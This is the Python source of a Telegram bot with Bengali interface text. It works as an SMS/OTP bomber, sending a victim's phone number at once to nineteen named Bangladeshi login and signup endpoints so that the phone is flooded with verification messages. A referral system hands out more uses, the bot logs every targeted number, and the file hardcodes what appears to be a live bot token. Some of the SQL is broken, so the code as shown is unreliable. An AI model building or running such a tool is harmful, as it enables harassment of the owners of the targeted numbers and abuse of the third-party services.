import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import sqlite3
import uuid
import requests
import asyncio
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ===== 🔴 আপনার ১९টি API (সব POST) =====
ALL_APIS = [
    {
        "name": "🔵 Bikroy",
        "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={}",
        "method": "POST",
    },
    {
        "name": "🔵 Bioscope",
        "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
    },
    {
        "name": "🔵 Daraz",
        "url": "https://acs-m.daraz.com.bd/h5/mtop.lazada.member.user.biz.sendverificationsms/1.0/?jsv=2.7.5&appKey=24937400&t=1776492532322&sign=f87c4710a8875f4d8b0532080fdde34a&api=mtop.lazada.member.user.biz.sendVerificationSms&v=1.0&type=originaljson&isSec=1&AntiCreep=true&timeout=20000&dataType=json&sessionOption=AutoLoginOnly&x-i18n-language=en&x-i18n-regionID=BD",
        "method": "POST",
    },
    {
        "name": "🔵 Banglalink",
        "url": "https://web-api.banglalink.net/api/v1/user/otp-login/request",
        "method": "POST",
    },
    {
        "name": "🔵 Grameenphone",
        "url": "https://webloginda.grameenphone.com/backend/api/v1/otp",
        "method": "POST",
    },
    {
        "name": "🔵 Robi",
        "url": "https://www.robi.com.bd/en",
        "method": "POST",
    },
    {
        "name": "🔵 Shikho",
        "url": "https://api.shikho.com/auth/v2/send/sms",
        "method": "POST",
    },
    {
        "name": "🔵 Shwapno",
        "url": "https://www.shwapno.com/api/auth",
        "method": "POST",
    },
    {
        "name": "🔵 Airtel",
        "url": "https://www.bd.airtel.com/en",
        "method": "POST",
    },
    {
        "name": "🔵 MewMew Shop",
        "url": "https://mewmewshopbd.com/send-otp-to-user",
        "method": "POST",
    },
    {
        "name": "🔵 Rang BD",
        "url": "https://api.rang-bd.com/api/auth/otp",
        "method": "POST",
    },
    {
        "name": "🔵 Shopz",
        "url": "https://www.shopz.com.bd/api/v1/auth/send-otp",
        "method": "POST",
    },
    {
        "name": "🔵 Cartup",
        "url": "https://api.cartup.com/customer/api/v1/customer/auth/new-onboard/signup",
        "method": "POST",
    },
    {
        "name": "🔵 Rokomari",
        "url": "https://www.rokomari.com/login/check?emailOrPhone={}",
        "method": "POST",
    },
    {
        "name": "🔵 Arogga",
        "url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=146.0.0.0&os=Android&osv=10",
        "method": "POST",
    },
    {
        "name": "🔵 Medeasy",
        "url": "https://api.medeasy.health/api/send-otp/{}",
        "method": "POST",
    },
    {
        "name": "🔵 OSudpotro",
        "url": "https://api.osudpotro.com/api/v1/users/send_otp",
        "method": "POST",
    },
    {
        "name": "🔵 Epharma",
        "url": "https://epharma.com.bd/authentication/send-otp",
        "method": "POST",
    },
    {
        "name": "🔵 Lifeplus",
        "url": "https://lifeplusbd.com/register",
        "method": "POST",
    }
]

# 🔴 কনফিগারেশন
BOT_TOKEN = "8679921207:AAFmrtDTSM0d41iC76Ln9R_ECqMJWIiKf7Q"
ADMIN_ID = 8210146346
CHANNEL_1 = "@primiumboss29"
CHANNEL_2 = "@saniedit9"
ADMIN_USERNAME = "@jiolinhacker"

# লগিং
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# থ্রেড পুল
executor = ThreadPoolExecutor(max_workers=19)

# ===== ডাটাবেস সেটআপ =====
def init_database():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  username TEXT,
                  referral_code TEXT UNIQUE,
                  referrer_id INTEGER,
                  user_limit INTEGER DEFAULT 4,,
                  verified INTEGER DEFAULT 0,
                  created_at TEXT,
                  banned INTEGER DEFAULT 0)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS usage_log
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  phone TEXT,
                  success_count INTEGER,
                  created_at TEXT)''')
    
    conn.commit()
    conn.close()

init_database()

# ===== ডাটাবেস ফাংশন =====

def get_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def create_user(user_id, username, referrer_id=None):
    referral_code = str(uuid.uuid4())[:8]
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    limit = 2 if referrer_id else 4
    
    c.execute('''INSERT INTO users 
                 (user_id, username, referral_code, referrer_id, limit, created_at)
                 VALUES (?, ?, ?, ?, ?, ?)''',
              (user_id, username, referral_code, referrer_id, limit, datetime.now().isoformat()))
    
    conn.commit()
    conn.close()
    return referral_code

def decrease_limit(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('UPDATE users SET limit = limit - 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def count_referrals(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM users WHERE referrer_id = ?', (user_id,))
    count = c.fetchone()[0]
    conn.close()
    return count

def log_usage(user_id, phone, success_count):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''INSERT INTO usage_log 
                 (user_id, phone, success_count, created_at)
                 VALUES (?, ?, ?, ?)''',
              (user_id, phone, success_count, datetime.now().isoformat()))
    conn.commit()
    conn.close()

# ===== API কল করা =====

def call_single_api(api_config, phone_number):
    try:
        payload = {"phone": phone_number}
        response = requests.post(
            api_config["url"], 
            json=payload, 
            timeout=3,
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        
        if response.status_code in [200, 201]:
            return True
        else:
            return False
    except:
        return False

async def call_all_apis(phone_number):
    loop = asyncio.get_event_loop()
    
    tasks = [
        loop.run_in_executor(executor, call_single_api, api, phone_number)
        for api in ALL_APIS
    ]
    
    results = await asyncio.gather(*tasks)
    return results

# ===== কমান্ড হ্যান্ডলার =====

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Anonymous"
    
    user = get_user(user_id)
    
    if not user:
        keyboard = [
            [InlineKeyboardButton("✅ যোগ দিন", callback_data="join_sponsor")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🎉 স্বাগতম!\n\n"
            "এই বটটি ব্যবহার করতে আমাদের চ্যানেলে যোগ দিন এবং যাচাই করুন।\n\n"
            f"📢 চ্যানেল: {CHANNEL_1} এবং {CHANNEL_2}",
            reply_markup=reply_markup
        )
    else:
        if user[5] == 0:
            keyboard = [
                [InlineKeyboardButton("✅ যাচাই করুন", callback_data="verify")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                "⏳ আপনাকে যাচাই করতে হবে।",
                reply_markup=reply_markup
            )
        else:
            await show_user_menu(update, context, is_query=False)

async def show_user_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, is_query=True):
    user_id = update.effective_user.id
    user = get_user(user_id)
    
    keyboard = [
        [InlineKeyboardButton("🔗 আমার রেফার লিংক", callback_data="my_referral")],
        [InlineKeyboardButton("👥 আমার রেফার", callback_data="my_referrals")],
        [InlineKeyboardButton("📱 OTP পাঠান", callback_data="send_otp")],
        [InlineKeyboardButton("📞 এডমিনের সাথে যোগাযোগ", callback_data="contact_admin")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message_text = (
        f"👤 স্বাগতম, {update.effective_user.first_name}!\n\n"
        f"📊 আপনার তথ্য:\n"
        f"• লিমিট বাকি: {user[4]} ⚡\n"
        f"• স্ট্যাটাস: ✅ যাচাইকৃত"
    )
    
    if is_query:
        await update.callback_query.edit_message_text(
            message_text,
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            message_text,
            reply_markup=reply_markup
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user = get_user(user_id)
    
    if query.data == "my_referral":
        referral_link = f"https://t.me/saniedit9_bot?start={user[2]}"
        keyboard = [[InlineKeyboardButton("🔙 ফিরে যান", callback_data="back_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🔗 আপনার রেফার লিংক:\n\n`{referral_link}`",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    
    elif query.data == "my_referrals":
        count = count_referrals(user_id)
        keyboard = [[InlineKeyboardButton("🔙 ফিরে যান", callback_data="back_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"👥 আপনি মোট {count} জন রেফার করেছেন।\n"
            f"💰 লিমিট পেয়েছেন: {count * 2}",
            reply_markup=reply_markup
        )
    
    elif query.data == "send_otp":
        if user[4] <= 0:
            keyboard = [[InlineKeyboardButton("🔙 ফিরে যান", callback_data="back_menu")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "❌ লিমিট শেষ!\n\n💡 রেফার করুন লিমিট পেতে।",
                reply_markup=reply_markup
            )
            return
        
        await query.edit_message_text(
            "📞 নম্বর দিন:\n"
            "উদাহরণ: 01700000000"
        )
        context.user_data['waiting_for_phone'] = True
    
    elif query.data == "contact_admin":
        keyboard = [[InlineKeyboardButton("🔙 ফিরে যান", callback_data="back_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"📞 এডমিন: {ADMIN_USERNAME}",
            reply_markup=reply_markup
        )
    
    elif query.data == "back_menu":
        await show_user_menu(update, context, is_query=True)
    
    elif query.data == "verify":
        keyboard = [[InlineKeyboardButton("✅ সম্পন্ন", callback_data="verify_done")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"✅ চ্যানেলে যোগ দিন:\n\n"
            f"{CHANNEL_1}\n{CHANNEL_2}",
            reply_markup=reply_markup
        )
    
    elif query.data == "verify_done":
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute('UPDATE users SET verified = 1 WHERE user_id = ?', (user_id,))
        conn.commit()
        conn.close()
        
        await query.edit_message_text("🎉 যাচাই সম্পূর্ণ! /start লিখুন।")
    
    elif query.data == "join_sponsor":
        keyboard = [[InlineKeyboardButton("✅ যাচাই করুন", callback_data="verify")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "চ্যানেলে যোগ দিন এবং যাচাই করুন।",
            reply_markup=reply_markup
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    
    if not user or not context.user_data.get('waiting_for_phone'):
        return
    
    phone = update.message.text.strip()
    
    if not phone.isdigit() or len(phone) != 11:
        await update.message.reply_text("❌ ১১ ডিজিটের নম্বর দিন।")
        return
    
    decrease_limit(user_id)
    user = get_user(user_id)
    
    status_msg = await update.message.reply_text(
        f"⏳ সব API তে পাঠাচ্ছি...\n"
        f"📱 নম্বর: {phone}"
    )
    
    results = await call_all_apis(phone)
    success_count = sum(1 for result in results if result)
    
    log_usage(user_id, phone, success_count)
    
    result_text = (
        f"✅ সফল!\n\n"
        f"📱 নম্বর: {phone}\n"
        f"📊 কোড সেন্ড: {success_count}/{len(ALL_APIS)}\n"
        f"⚡ বাকি লিমিট: {user[4]}"
    )
    
    await status_msg.edit_text(result_text)
    context.user_data['waiting_for_phone'] = False

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ এডমিন নন।")
        return
    
    await update.message.reply_text("⚙️ এডমিন প্যানেল")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    app.run_polling()

if __name__ == '__main__':
    main()
